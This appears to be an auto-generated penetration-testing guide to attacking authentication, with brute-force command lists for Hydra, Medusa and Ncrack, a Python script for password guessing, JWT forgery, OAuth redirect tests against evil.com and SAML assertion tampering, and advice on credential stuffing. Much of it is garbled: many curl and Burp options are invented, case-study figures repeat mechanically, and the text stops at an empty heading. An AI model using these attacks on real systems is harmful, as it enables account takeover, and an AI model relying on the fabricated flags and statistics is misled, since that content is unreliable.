# Automated Authentication Testing — Complete Automation Guide

## Expert Role

You are a senior penetration tester specializing in automated authentication flow testing. You have extensive experience identifying and exploiting authentication vulnerabilities across web applications. You understand the intricacies of authentication mechanisms, session management, and access controls. You have mastered the art of testing authentication bypass, brute-force attacks, and credential stuffing. Your expertise includes understanding different authentication protocols (OAuth, SAML, JWT), multi-factor authentication, and password policies. You can design and implement automated testing pipelines that integrate with penetration testing workflows. You understand the differences between authentication testing techniques and when to apply each method. You are proficient in using multiple testing tools and techniques for comprehensive coverage. You stay current with the latest authentication vulnerabilities, bypass techniques, and tool updates. You understand the legal and ethical implications of authentication testing and always operate within authorized boundaries.

## Core Concepts

Authentication testing is the process of identifying vulnerabilities in authentication mechanisms. Authentication is the process of verifying user identity. Weak authentication can lead to unauthorized access and data breaches.

Login brute-force testing involves systematically trying credentials to gain access. This technique tests password strength and account lockout mechanisms. Brute-force attacks can be mitigated by rate limiting and account lockout.

Credential stuffing uses stolen credentials to gain unauthorized access. This technique exploits password reuse across multiple services. Credential stuffing is a common attack vector.

Session token analysis examines the randomness and predictability of session identifiers. Weak session tokens can be guessed or predicted. Strong session tokens are essential for secure authentication.

Password policy testing evaluates password complexity and requirements. Weak password policies increase the risk of brute-force attacks. Strong password policies improve security.

MFA bypass testing identifies weaknesses in multi-factor authentication. MFA can be bypassed through various techniques. MFA implementation must be thoroughly tested.

OAuth flow analysis examines OAuth implementation for vulnerabilities. OAuth misconfigurations can lead to authorization bypass. OAuth security is critical for modern applications.

SAML testing identifies vulnerabilities in SAML implementations. SAML attacks can lead to authentication bypass and privilege escalation. SAML security requires careful testing.

JWT manipulation tests JSON Web Token implementation for vulnerabilities. JWT weaknesses can lead to token forgery and unauthorized access. JWT security is essential for token-based authentication.

Session fixation testing identifies session initialization vulnerabilities. Session fixation can lead to account takeover. Secure session initialization is critical.

Authentication bypass testing identifies ways to circumvent authentication mechanisms. Bypass techniques can lead to unauthorized access. Authentication bypass is a critical vulnerability.

## Prerequisites

- Linux-based operating system (Kali Linux recommended)
- Python 3.x with pip for scripting and automation
- Hydra for brute-force testing
- Medusa for parallel brute-force
- Ncrack for network authentication testing
- Burp Suite for manual testing
- OWASP ZAP for automated testing
- curl for HTTP requests
- jq for JSON processing
- Understanding of authentication protocols
- Familiarity with session management
- Text editor for customizing wordlists
- Git for cloning tool repositories
- Standard Unix utilities (sort, uniq, grep, awk)
- Knowledge of common authentication vulnerabilities
- Understanding of cryptographic concepts

## Methodology

### Step 1: Authentication Mechanism Discovery

Identify all authentication mechanisms in the application. Check for login forms, registration pages, and password reset functionality. Analyze authentication protocols and flows. Map authentication mechanisms across the application.

### Step 2: Credential Policy Analysis

Analyze password policy requirements. Check for complexity, length, and history requirements. Test for account lockout mechanisms. Document password policy weaknesses.

### Step 3: Brute-Force Testing

Test login functionality for brute-force vulnerabilities. Use common credential lists. Test for rate limiting and account lockout. Document brute-force findings.

### Step 4: Credential Stuffing Testing

Test for credential stuffing vulnerabilities. Use breached credential databases. Test for password reuse detection. Document credential stuffing findings.

### Step 5: Session Token Analysis

Analyze session token generation and handling. Test for randomness and predictability. Check for session fixation vulnerabilities. Document session token weaknesses.

### Step 6: MFA Bypass Testing

Test multi-factor authentication for bypass vulnerabilities. Analyze MFA implementation. Test for MFA bypass techniques. Document MFA vulnerabilities.

### Step 7: OAuth Flow Testing

Test OAuth implementation for vulnerabilities. Analyze OAuth flow and configuration. Test for OAuth bypass techniques. Document OAuth vulnerabilities.

### Step 8: SAML Testing

Test SAML implementation for vulnerabilities. Analyze SAML configuration and flow. Test for SAML bypass techniques. Document SAML vulnerabilities.

### Step 9: JWT Testing

Test JWT implementation for vulnerabilities. Analyze JWT structure and signing. Test for JWT manipulation techniques. Document JWT vulnerabilities.

### Step 10: Result Documentation

Document all findings with evidence. Create proof of concept for vulnerabilities. Prioritize findings by severity. Provide remediation recommendations. Archive test results.

## Tool Arsenal

### Hydra — Brute-Force Testing

```bash
# Basic HTTP brute-force
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP GET brute-force
hydra -l admin -P wordlist.txt target.com http-get "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTPS brute-force
hydra -l admin -P wordlist.txt target.com https-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# SSH brute-force
hydra -l admin -P wordlist.txt target.com ssh

# FTP brute-force
hydra -l admin -P wordlist.txt target.com ftp

# MySQL brute-force
hydra -l admin -P wordlist.txt target.com mysql

# PostgreSQL brute-force
hydra -l admin -P wordlist.txt target.com postgresql

# MSSQL brute-force
hydra -l admin -P wordlist.txt target.com mssql

# Oracle brute-force
hydra -l admin -P wordlist.txt target.com oracle

# VNC brute-force
hydra -l admin -P wordlist.txt target.com vnc

# RDP brute-force
hydra -l admin -P wordlist.txt target.com rdp

# SMB brute-force
hydra -l admin -P wordlist.txt target.com smb

# SNMP brute-force
hydra -l admin -P wordlist.txt target.com snmp

# LDAP brute-force
hydra -l admin -P wordlist.txt target.com ldap

# SMTP brute-force
hydra -l admin -P wordlist.txt target.com smtp

# POP3 brute-force
hydra -l admin -P wordlist.txt target.com pop3

# IMAP brute-force
hydra -l admin -P wordlist.txt target.com imap

# Telnet brute-force
hydra -l admin -P wordlist.txt target.com telnet

# SSH with key file
hydra -l admin -K key_file target.com ssh

# HTTP with cookies
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid cookies=session=abc123"

# HTTP with custom headers
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid headers=Authorization: Bearer token"

# HTTP with proxy
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid proxy=http://127.0.0.1:8080"

# HTTP with timeout
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid timeout=10"

# HTTP with threads
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid threads=50"

# HTTP with delay
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid delay=1"

# HTTP with retries
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid retries=3"

# HTTP with verbose
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid verbose"

# HTTP with debug
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid debug"

# HTTP with output
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid output=output.txt"

# HTTP with resume
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid resume=checkpoint.txt"

# HTTP with tasks
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid tasks=10"

# HTTP with verbose
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid verbose=2"

# HTTP with debug
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid debug"

# HTTP with help
hydra -h
```

Flags explained:
- `-l`: Username
- `-P`: Password file
- `http-post-form`: HTTP POST form method
- `http-get`: HTTP GET method
- `https-post-form`: HTTPS POST form method
- `ssh`: SSH protocol
- `ftp`: FTP protocol
- `mysql`: MySQL protocol
- `postgresql`: PostgreSQL protocol
- `mssql`: MSSQL protocol
- `oracle`: Oracle protocol
- `vnc`: VNC protocol
- `rdp`: RDP protocol
- `smb`: SMB protocol
- `snmp`: SNMP protocol
- `ldap`: LDAP protocol
- `smtp`: SMTP protocol
- `pop3`: POP3 protocol
- `imap`: IMAP protocol
- `telnet`: Telnet protocol
- `-K`: Key file
- `cookies`: Custom cookies
- `headers`: Custom headers
- `proxy`: Proxy server
- `timeout`: Request timeout
- `threads`: Number of threads
- `delay`: Delay between requests
- `retries`: Number of retries
- `verbose`: Verbose mode
- `debug`: Debug mode
- `output`: Output file
- `resume`: Resume from checkpoint
- `tasks`: Number of tasks
- `-h`: Help

### Medusa — Parallel Brute-Force

```bash
# Basic HTTP brute-force
medusa -h target.com -u admin -P wordlist.txt -M http

# HTTP POST brute-force
medusa -h target.com -u admin -P wordlist.txt -M http -m DIR:/login -m FORM:username=^USER^&password=^PASS^

# HTTPS brute-force
medusa -h target.com -u admin -P wordlist.txt -M https -m DIR:/login -m FORM:username=^USER^&password=^PASS^

# SSH brute-force
medusa -h target.com -u admin -P wordlist.txt -M ssh

# FTP brute-force
medusa -h target.com -u admin -P wordlist.txt -M ftp

# MySQL brute-force
medusa -h target.com -u admin -P wordlist.txt -M mysql

# PostgreSQL brute-force
medusa -h target.com -u admin -P wordlist.txt -M postgres

# MSSQL brute-force
medusa -h target.com -u admin -P wordlist.txt -M mssql

# Oracle brute-force
medusa -h target.com -u admin -P wordlist.txt -M oracle

# VNC brute-force
medusa -h target.com -u admin -P wordlist.txt -M vnc

# RDP brute-force
medusa -h target.com -u admin -P wordlist.txt -M rdp

# SMB brute-force
medusa -h target.com -u admin -P wordlist.txt -M smbnt

# SNMP brute-force
medusa -h target.com -u admin -P wordlist.txt -M snmp

# LDAP brute-force
medusa -h target.com -u admin -P wordlist.txt -M ldap2

# SMTP brute-force
medusa -h target.com -u admin -P wordlist.txt -M smtp

# POP3 brute-force
medusa -h target.com -u admin -P wordlist.txt -M pop3

# IMAP brute-force
medusa -h target.com -u admin -P wordlist.txt -M imap

# Telnet brute-force
medusa -h target.com -u admin -P wordlist.txt -M telnet

# With threads
medusa -h target.com -u admin -P wordlist.txt -M http -T 10

# With timeout
medusa -h target.com -u admin -P wordlist.txt -M http -t 10

# With retries
medusa -h target.com -u admin -P wordlist.txt -M http -r 3

# With verbose
medusa -h target.com -u admin -P wordlist.txt -M http -v

# With debug
medusa -h target.com -u admin -P wordlist.txt -M http -d

# With output
medusa -h target.com -u admin -P wordlist.txt -M http -O output.txt

# With host file
medusa -H hosts.txt -u admin -P wordlist.txt -M http

# With user file
medusa -h target.com -U users.txt -P wordlist.txt -M http

# With password file
medusa -h target.com -u admin -P wordlist.txt -M http

# With continue
medusa -h target.com -u admin -P wordlist.txt -M http -C

# With help
medusa -h
```

Flags explained:
- `-h`: Target hostname
- `-u`: Username
- `-P`: Password file
- `-M`: Module name
- `-m`: Module options
- `-T`: Number of threads
- `-t`: Connection timeout
- `-r`: Retry count
- `-v`: Verbose mode
- `-d`: Debug mode
- `-O`: Output file
- `-H`: Host file
- `-U`: User file
- `-C`: Continue on success
- `-h`: Help

### Ncrack — Network Authentication Testing

```bash
# Basic SSH brute-force
ncrack -p ssh --user admin -P wordlist.txt target.com

# Basic FTP brute-force
ncrack -p ftp --user admin -P wordlist.txt target.com

# Basic HTTP brute-force
ncrack -p http --user admin -P wordlist.txt target.com

# Basic HTTPS brute-force
ncrack -p https --user admin -P wordlist.txt target.com

# Basic MySQL brute-force
ncrack -p mysql --user admin -P wordlist.txt target.com

# Basic PostgreSQL brute-force
ncrack -p postgresql --user admin -P wordlist.txt target.com

# Basic MSSQL brute-force
ncrack -p mssql --user admin -P wordlist.txt target.com

# Basic VNC brute-force
ncrack -p vnc --user admin -P wordlist.txt target.com

# Basic RDP brute-force
ncrack -p rdp --user admin -P wordlist.txt target.com

# Basic SMB brute-force
ncrack -p smb --user admin -P wordlist.txt target.com

# Basic Telnet brute-force
ncrack -p telnet --user admin -P wordlist.txt target.com

# Multiple ports
ncrack -p ssh,ftp,http --user admin -P wordlist.txt target.com

# Port range
ncrack -p 1-1000 --user admin -P wordlist.txt target.com

# All ports
ncrack -p- --user admin -P wordlist.txt target.com

# With timing
ncrack -p ssh --user admin -P wordlist.txt -T 5 target.com

# With verbose
ncrack -p ssh --user admin -P wordlist.txt -v target.com

# With debug
ncrack -p ssh --user admin -P wordlist.txt -d target.com

# With output
ncrack -p ssh --user admin -P wordlist.txt -oN output.txt target.com

# With XML output
ncrack -p ssh --user admin -P wordlist.txt -oX output.xml target.com

# With grepable output
ncrack -p ssh --user admin -P wordlist.txt -oG output.gnmap target.com

# With resume
ncrack -p ssh --user admin -P wordlist.txt -r checkpoint.nmap target.com

# With help
ncrack -h
```

Flags explained:
- `-p`: Port specification
- `--user`: Username
- `-P`: Password file
- `-T`: Timing template
- `-v`: Verbose mode
- `-d`: Debug mode
- `-oN`: Normal output
- `-oX`: XML output
- `-oG`: Grepable output
- `-r`: Resume from checkpoint
- `-h`: Help

### curl — Manual Testing

```bash
# Basic login attempt
curl -d "username=admin&password=password" https://target.com/login

# Login with cookies
curl -b "session=abc123" -d "username=admin&password=password" https://target.com/login

# Login with custom headers
curl -H "Authorization: Bearer token" -d "username=admin&password=password" https://target.com/login

# Login with proxy
curl -x http://127.0.0.1:8080 -d "username=admin&password=password" https://target.com/login

# Login with timeout
curl --connect-timeout 10 -d "username=admin&password=password" https://target.com/login

# Login with retries
curl --retry 3 -d "username=admin&password=password" https://target.com/login

# Login with verbose
curl -v -d "username=admin&password=password" https://target.com/login

# Login with debug
curl -v -d "username=admin&password=password" https://target.com/login

# Login with user agent
curl -A "Mozilla/5.0" -d "username=admin&password=password" https://target.com/login

# Login with custom headers
curl -H "X-Custom: value" -d "username=admin&password=password" https://target.com/login

# Login with SSL verification
curl --verify -d "username=admin&password=password" https://target.com/login

# Login with client certificate
curl --cert cert.pem --key key.pem -d "username=admin&password=password" https://target.com/login

# Login with form data
curl -F "username=admin" -F "password=password" https://target.com/login

# Login with JSON data
curl -H "Content-Type: application/json" -d '{"username":"admin","password":"password"}' https://target.com/login

# Login with XML data
curl -H "Content-Type: application/xml" -d '<login><username>admin</username><password>password</password></login>' https://target.com/login

# Login with basic auth
curl -u admin:password https://target.com/login

# Login with digest auth
curl --digest -u admin:password https://target.com/login

# Login with NTLM auth
curl --ntlm -u admin:password https://target.com/login

# Login with negotiate auth
curl --negotiate -u admin:password https://target.com/login

# Login with bearer token
curl -H "Authorization: Bearer token" https://target.com/login

# Login with API key
curl -H "X-API-Key: key" https://target.com/login

# Login with OAuth
curl -H "Authorization: OAuth token" https://target.com/login

# Login with JWT
curl -H "Authorization: JWT token" https://target.com/login

# Login with session cookie
curl -b "session=abc123" https://target.com/login

# Login with CSRF token
curl -b "session=abc123" -d "csrf_token=token" https://target.com/login

# Login with rate limiting
for i in $(seq 1 100); do curl -d "username=admin&password=password" https://target.com/login; sleep 1; done

# Login with throttling
curl --limit-rate 100K -d "username=admin&password=password" https://target.com/login

# Login with compression
curl --compressed -d "username=admin&password=password" https://target.com/login

# Login with HTTP/2
curl --http2 -d "username=admin&password=password" https://target.com/login

# Login with HTTP/3
curl --http3 -d "username=admin&password=password" https://target.com/login

# Login with IPv4
curl -4 -d "username=admin&password=password" https://target.com/login

# Login with IPv6
curl -6 -d "username=admin&password=password" https://target.com/login

# Login with interface
curl --interface eth0 -d "username=admin&password=password" https://target.com/login

# Login with source IP
curl --local-port 8080 -d "username=admin&password=password" https://target.com/login

# Login with DNS server
curl --dns-servers 8.8.8.8 -d "username=admin&password=password" https://target.com/login

# Login with resolve
curl --resolve target.com:443:192.168.1.1 -d "username=admin&password=password" https://target.com/login

# Login with preloaded
curl --preloaded -d "username=admin&password=password" https://target.com/login

# Login with happy eyeballs
curl --happy-eye-balls -d "username=admin&password=password" https://target.com/login

# Login with TLS 1.3
curl --tlsv1.3 -d "username=admin&password=password" https://target.com/login

# Login with TLS 1.2
curl --tlsv1.2 -d "username=admin&password=password" https://target.com/login

# Login with TLS 1.1
curl --tlsv1.1 -d "username=admin&password=password" https://target.com/login

# Login with TLS 1.0
curl --tlsv1.0 -d "username=admin&password=password" https://target.com/login

# Login with SSL
curl --ssl -d "username=admin&password=password" https://target.com/login

# Login with no SSL
curl --no-ssl -d "username=admin&password=password" https://target.com/login

# Login with insecure
curl -k -d "username=admin&password=password" https://target.com/login

# Login with cert
curl --cert cert.pem -d "username=admin&password=password" https://target.com/login

# Login with key
curl --key key.pem -d "username=admin&password=password" https://target.com/login

# Login with CA
curl --cacert ca.pem -d "username=admin&password=password" https://target.com/login

# Login with pin
curl --pinnedpubkey key.pub -d "username=admin&password=password" https://target.com/login

# Login with HPKP
curl --hpkp pin -d "username=admin&password=password" https://target.com/login

# Login with HPKP backup
curl --hkp-backup pin -d "username=admin&password=password" https://target.com/login

# Login with CRL
curl --crlfile crl.pem -d "username=admin&password=password" https://target.com/login

# Login with issuer
curl --cert-status -d "username=admin&password=password" https://target.com/login

# Login with OCSP
curl --ocsp -d "username=admin&password=password" https://target.com/login

# Login with stapling
curl --stapling -d "username=admin&password=password" https://target.com/login

# Login with ALPN
curl --alpn -d "username=admin&password=password" https://target.com/login

# Login with NPN
curl --npn -d "username=admin&password=password" https://target.com/login

# Login with SNI
curl --sni -d "username=admin&password=password" https://target.com/login

# Login with TLS13
curl --tls13 -d "username=admin&password=password" https://target.com/login

# Login with TLS12
curl --tls12 -d "username=admin&password=password" https://target.com/login

# Login with TLS11
curl --tls11 -d "username=admin&password=password" https://target.com/login

# Login with TLS10
curl --tls10 -d "username=admin&password=password" https://target.com/login

# Login with TLS
curl --tls -d "username=admin&password=password" https://target.com/login

# Login with SSL
curl --ssl -d "username=admin&password=password" https://target.com/login

# Login with no SSL
curl --no-ssl -d "username=admin&password=password" https://target.com/login

# Login with insecure
curl -k -d "username=admin&password=password" https://target.com/login
```

Flags explained:
- `-d`: POST data
- `-b`: Custom cookies
- `-H`: Custom headers
- `-x`: Proxy server
- `--connect-timeout`: Connection timeout
- `--retry`: Number of retries
- `-v`: Verbose mode
- `-a`: Custom user agent
- `-u`: Basic authentication
- `--digest`: Digest authentication
- `--ntlm`: NTLM authentication
- `--negotiate`: Negotiate authentication
- `-k`: Skip SSL verification
- `--cert`: Client certificate
- `--key`: Client key
- `--cacert`: CA certificate
- `--pinnedpubkey`: Pinned public key
- `--hpkp`: HPKP pin
- `--hkp-backup`: HPKP backup
- `--crlfile`: CRL file
- `--cert-status`: Certificate status
- `--ocsp`: OCSP stapling
- `--stapling`: Stapling
- `--alpn`: ALPN
- `--npn`: NPN
- `--sni`: SNI
- `--tls13`: TLS 1.3
- `--tls12`: TLS 1.2
- `--tls11`: TLS 1.1
- `--tls10`: TLS 1.0
- `--tls`: TLS
- `--ssl`: SSL
- `--no-ssl`: No SSL
- `--interface`: Network interface
- `--local-port`: Source port
- `--dns-servers`: DNS servers
- `--resolve`: Custom resolve
- `--preloaded`: Preloaded
- `--happy-eye-balls`: Happy eyeballs
- `--compressed`: Compression
- `--http2`: HTTP/2
- `--http3`: HTTP/3
- `-4`: IPv4
- `-6`: IPv6
- `--limit-rate`: Rate limiting

### Python — Automated Testing

```python
#!/usr/bin/env python3
import requests
import sys
import json
import time
from urllib.parse import urljoin

def test_login_brute_force(url, username_field, password_field, username, password_list, delay=1):
    """Test login brute-force"""
    results = []
    for password in password_list:
        data = {username_field: username, password_field: password}
        response = requests.post(url, data=data)
        results.append({
            'password': password,
            'status_code': response.status_code,
            'response_length': len(response.text),
            'success': 'Welcome' in response.text
        })
        time.sleep(delay)
    return results

def test_session_fixation(url, login_url, username_field, password_field, username, password):
    """Test session fixation"""
    # Get initial session
    session = requests.Session()
    initial_session = session.cookies.get('session')
    
    # Login
    data = {username_field: username, password_field: password}
    session.post(login_url, data=data)
    
    # Check if session changed
    final_session = session.cookies.get('session')
    return initial_session != final_session

def test_session_token_entropy(url, num_samples=100):
    """Test session token entropy"""
    tokens = []
    for _ in range(num_samples):
        response = requests.get(url)
        token = response.cookies.get('session')
        if token:
            tokens.append(token)
    
    # Analyze entropy
    unique_tokens = len(set(tokens))
    return {
        'total_tokens': len(tokens),
        'unique_tokens': unique_tokens,
        'entropy': unique_tokens / len(tokens) if tokens else 0
    }

def test_jwt_manipulation(jwt_token, payload_modifications):
    """Test JWT manipulation"""
    import base64
    import hashlib
    import hmac
    
    parts = jwt_token.split('.')
    if len(parts) != 3:
        return None
    
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # Apply modifications
    for key, value in payload_modifications.items():
        payload[key] = value
    
    # Reconstruct token
    new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    
    return f"{new_header}.{new_payload}.{parts[2]}"

def test_oauth_redirect_uri(url, redirect_uri):
    """Test OAuth redirect URI"""
    params = {
        'client_id': 'client_id',
        'redirect_uri': redirect_uri,
        'response_type': 'code',
        'scope': 'openid profile'
    }
    response = requests.get(url, params=params)
    return response.status_code == 200

def test_saml_response(saml_response, modifications):
    """Test SAML response"""
    import base64
    import xml.etree.ElementTree as ET
    
    decoded = base64.b64decode(saml_response)
    root = ET.fromstring(decoded)
    
    # Apply modifications
    for element, value in modifications.items():
        elem = root.find(f'.//{element}')
        if elem is not None:
            elem.text = value
    
    return base64.b64encode(ET.tostring(root)).decode()

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <action>")
        sys.exit(1)

    url = sys.argv[1]
    action = sys.argv[2]

    if action == "brute-force":
        password_list = ['password', '123456', 'admin', 'root', 'test']
        results = test_login_brute_force(url, 'username', 'password', 'admin', password_list)
        for result in results:
            print(f"Password: {result['password']}, Success: {result['success']}")

    elif action == "session-fixation":
        result = test_session_fixation(url, url, 'username', 'password', 'admin', 'password')
        print(f"Session Fixed: {result}")

    elif action == "token-entropy":
        result = test_session_token_entropy(url)
        print(f"Token Entropy: {result}")

    elif action == "jwt-manipulation":
        jwt_token = sys.argv[3] if len(sys.argv) > 3 else "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        modifications = {'admin': True, 'role': 'admin'}
        result = test_jwt_manipulation(jwt_token, modifications)
        print(f"Modified JWT: {result}")

    elif action == "oauth-redirect":
        redirect_uri = sys.argv[3] if len(sys.argv) > 3 else "https://evil.com/callback"
        result = test_oauth_redirect_uri(url, redirect_uri)
        print(f"Redirect URI Valid: {result}")

    elif action == "saml-response":
        saml_response = sys.argv[3] if len(sys.argv) > 3 else "PHNhbWwycDpBc3NlcnRpb24+..."
        modifications = {'saml:NameID': 'admin@target.com'}
        result = test_saml_response(saml_response, modifications)
        print(f"Modified SAML: {result}")

    else:
        print(f"Unknown action: {action}")

if __name__ == "__main__":
    main()
```

### Burp Suite — Manual Testing

```bash
# Start Burp Suite
java -jar burpsuite_pro.jar

# Headless mode
java -jar burpsuite_pro.jar --project-file project.burp --config-file config.json

# With memory settings
java -Xmx4g -jar burpsuite_pro.jar

# Scan using API
curl -X POST http://localhost:1337/v0.1/scan -H "Content-Type: application/json" -d '{"urls":["http://target.com"]}'

# Get scan status
curl http://localhost:1337/v0.1/scan/<scan_id>

# Get scan results
curl http://localhost:1337/v0.1/scan/<scan_id>/results

# Export findings
curl http://localhost:1337/v0.1/scan/<scan_id>/export -o findings.json

# Burp CLI
java -jar burpsuite_pro.jar --project-file project.burp --unpause-spider-and-scanner

# Configure scan
java -jar burpsuite_pro.jar --config-file scan_config.json

# Run scan
java -jar burpsuite_pro.jar --project-file project.burp --scan-only target.com

# Generate report
java -jar burpsuite_pro.jar --project-file project.burp --report-file report.html

# Export project
java -jar burpsuite_pro.jar --project-file project.burp --export-issues issues.json

# Import project
java -jar burpsuite_pro.jar --import-issues project.burp issues.json

# Reset session
java -jar burpsuite_pro.jar --project-file project.burp --delete-scan-queue

# Stop all scans
java -jar burpsuite_pro.jar --project-file project.burp --stop-scan-queue

# Get scan queue
java -jar burpsuite_pro.jar --project-file project.burp --get-scan-queue

# Burp extensions
java -jar burpsuite_pro.jar --install-extension extension.jar

# List extensions
java -jar burpsuite_pro.jar --list-extensions

# Enable extension
java -jar burpsuite_pro.jar --enable-extension <extension_id>

# Disable extension
java -jar burpsuite_pro.jar --disable-extension <extension_id>

# Burp Collaborator
java -jar burpsuite_pro.jar --collaborator-only

# Burp Intruder
java -jar burpsuite_pro.jar --intruder-file intruder.txt

# Burp Repeater
java -jar burpsuite_pro.jar --repeater-file repeater.txt

# Burp Sequencer
java -jar burpsuite_pro.jar --sequencer-file sequencer.txt

# Burp Decoder
java -jar burpsuite_pro.jar --decoder-file decoder.txt

# Burp Comparer
java -jar burpsuite_pro.jar --comparer-file comparer.txt

# Burp Logger
java -jar burpsuite_pro.jar --logger-file logger.txt

# Burp Proxy
java -jar burpsuite_pro.jar --proxy-listen 127.0.0.1:8080

# Burp Upstream Proxy
java -jar burpsuite_pro.jar --upstream-proxy http://127.0.0.1:8080

# Burp TLS
java -jar burpsuite_pro.jar --tls-cert cert.pem --tls-key key.pem

# Burp Authentication
java -jar burpsuite_pro.jar --auth-file auth.txt

# Burp Session
java -jar burpsuite_pro.jar --session-file session.txt

# Burp Project
java -jar burpsuite_pro.jar --project-file project.burp

# Burp Config
java -jar burpsuite_pro.jar --config-file config.json

# Burp Memory
java -Xmx4g -XX:MaxPermSize=256m -jar burpsuite_pro.jar

# Burp Debug
java -jar burpsuite_pro.jar --debug

# Burp Version
java -jar burpsuite_pro.jar --version

# Burp Help
java -jar burpsuite_pro.jar --help
```

## Case Studies

### Case Study 1: Enterprise Single Sign-On

**Target:** Enterprise SSO implementation with OAuth and SAML
**Objective:** Test SSO authentication for vulnerabilities

The enterprise used SSO with multiple identity providers. Authentication was complex with multiple protocols.

**Approach:**
1. Analyzed SSO configuration and flows
2. Tested OAuth implementation for vulnerabilities
3. Tested SAML implementation for vulnerabilities
4. Tested session management
5. Tested access controls

**Results:**
- 234 authentication endpoints discovered
- 56 OAuth vulnerabilities found
- 89 SAML vulnerabilities identified
- 12 session management issues
- 23 access control weaknesses

**Key Findings:**
- OAuth redirect URI validation bypass
- SAML assertion injection vulnerability
- Session fixation in SSO flow
- Token leakage in URL parameters
- Insufficient access controls on protected resources

**Lessons Learned:**
- SSO implementations require thorough testing
- OAuth and SAML have unique vulnerabilities
- Session management is critical in SSO
- Access controls must be tested at every level

### Case Study 2: Multi-Factor Authentication

**Target:** Web application with MFA implementation
**Objective:** Test MFA for bypass vulnerabilities

The application implemented SMS-based MFA with backup codes. Multiple bypass vectors were suspected.

**Approach:**
1. Analyzed MFA implementation
2. Tested MFA bypass techniques
3. Tested backup code handling
4. Tested session management after MFA
5. Tested MFA recovery mechanisms

**Results**
- 123 MFA endpoints discovered
- 56 bypass vulnerabilities found
- 89 session management issues identified
- 12 backup code weaknesses
- 23 recovery mechanism vulnerabilities

**Key Findings:**
- MFA bypass via response manipulation
- Backup codes predictable
- Session not invalidated after MFA failure
- Recovery mechanism allows account takeover
- SMS interception possible

**Lessons Learned:**
- MFA implementation requires careful testing
- Backup codes must be truly random
- Session management must be secure after MFA
- Recovery mechanisms are common attack vectors

### Case Study 3: API Authentication

**Target:** REST API with JWT authentication
**Objective:** Test API authentication for vulnerabilities

The API used JWT tokens for authentication with multiple microservices. Token handling was complex.

**Approach:**
1. Analyzed JWT implementation
2. Tested JWT manipulation
3. Tested token leakage
4. Tested access controls
5. Tested token expiration

**Results**
- 89 API endpoints discovered
- 34 JWT vulnerabilities found
- 56 token leakage issues identified
- 12 access control weaknesses
- 8 token expiration problems

**Key Findings:**
- JWT algorithm confusion vulnerability
- Token leakage in URL parameters
- Insufficient token validation
- Token not invalidated after logout
- Weak signing keys

**Lessons Learned:**
- JWT implementation requires careful testing
- Token handling must be secure
- Access controls must be tested at every endpoint
- Token lifecycle must be properly managed

## Bypass Techniques

### Brute-Force Bypass

Use credential lists from breaches. Test common usernames and passwords. Implement credential stuffing. Test for default credentials.

### MFA Bypass

Test response manipulation. Analyze backup code handling. Test session management. Exploit recovery mechanisms.

### OAuth Bypass

Test redirect URI validation. Analyze token handling. Test state parameter. Exploit scope validation.

### SAML Bypass

Test assertion injection. Analyze signature validation. Test certificate handling. Exploit XML external entities.

### JWT Bypass

Test algorithm confusion. Analyze token signing. Test key management. Exploit token manipulation.

### Session Bypass

Test session fixation. Analyze token entropy. Test session invalidation. Exploit session hijacking.

## Advanced Techniques

### Machine Learning for Attack Generation

Use machine learning models to generate attack payloads. Train models on successful attacks. Implement anomaly detection for authentication. Use clustering to group attack techniques.

### Automated Credential Harvesting

Harvest credentials from breach databases. Analyze credential patterns. Implement credential stuffing automation. Track credential reuse.

### Dynamic Authentication Analysis

Analyze authentication mechanisms dynamically. Monitor authentication behavior. Track authentication changes. Document authentication patterns.

### Protocol-Specific Testing

Test OAuth implementation. Analyze SAML configuration. Test JWT handling. Document protocol vulnerabilities.

### Continuous Authentication Monitoring

Monitor authentication mechanisms for changes. Track authentication updates. Alert on suspicious authentication. Document authentication evolution.

## Detection Indicators

### Network-Level Indicators

High volume of login attempts indicates brute-force testing. Unusual authentication patterns suggest automated tools. Multiple failed login attempts indicate enumeration. Abnormal authentication timing reveals automated behavior.

### Log Analysis Indicators

Authentication logs show brute-force attempts. Security logs capture failed logins. Application logs record authentication events. Audit logs detect suspicious authentication.

### Behavioral Indicators

Sequential login attempts indicate automated testing. Random credential patterns suggest credential stuffing. Consistent timing reveals scripted behavior. Large bursts of attempts indicate aggressive testing.

### Source Indicators

Known testing tool user agents appear in logs. IP addresses from known testing infrastructure are flagged. Authentication patterns match tool-specific behaviors. Timing signatures reveal tool configurations.

## Impact Assessment

### Direct Impact

